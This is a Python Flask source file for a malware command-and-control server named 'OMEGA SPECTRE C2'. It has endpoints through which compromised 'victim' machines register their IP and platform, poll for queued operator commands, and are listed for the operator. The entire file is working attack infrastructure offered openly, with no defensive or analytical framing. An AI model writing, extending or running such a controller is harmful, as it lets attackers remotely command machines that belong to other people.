# render_server.py
from flask import Flask, request, jsonify, render_template
import json
import time
import os

app = Flask(__name__)

# تخزين البيانات
victims = {}
commands = {}
results = {}

@app.route('/')
def index():
    return '''
    <h1>OMEGA SPECTRE C2</h1>
    <p>C2 Server is running</p>
    <p>Total Victims: 0</p>
    '''

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    victim_id = data.get('id', 'unknown')
    victims[victim_id] = {
        'ip': request.remote_addr,
        'platform': data.get('platform', 'unknown'),
        'status': 'active',
        'timestamp': time.time()
    }
    return jsonify({"status": "registered"})

@app.route('/api/command', methods=['GET'])
def get_command():
    victim_id = request.args.get('id')
    if victim_id and victim_id in commands and commands[victim_id]:
        cmd = commands[victim_id].pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('id')
    command = data.get('command')
    if victim_id and command:
        if victim_id not in commands:
            commands[victim_id] = []
        commands[victim_id].append(command)
        return jsonify({"status": "sent"})
    return jsonify({"status": "error"}), 400

@app.route('/api/victims', methods=['GET'])
def get_victims():
    return jsonify(victims)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)